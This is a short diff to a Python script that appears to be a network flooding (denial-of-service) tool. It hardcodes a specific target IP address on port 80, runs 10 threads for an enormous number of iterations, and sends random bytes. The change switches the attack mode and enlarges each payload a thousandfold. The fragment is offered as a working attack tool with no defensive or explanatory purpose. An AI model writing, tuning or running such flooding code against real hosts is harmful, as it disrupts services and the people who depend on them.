@@ -9,7 +9,7 @@ from multiprocessing.dummy import Pool as ThreadPool
 
 ip = '82.200.161.178'
 port = 80
-choice = '1'
+choice = '2'
 times = 10000000000
 threads = 10
 def run(a):
@@ -26,7 +26,7 @@ def run(a):
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(16*10)
+	data = random._urandom(16*10)*1000
 	i = random.choice(("[+]","-","[*]"))
 	while True:
 		try:
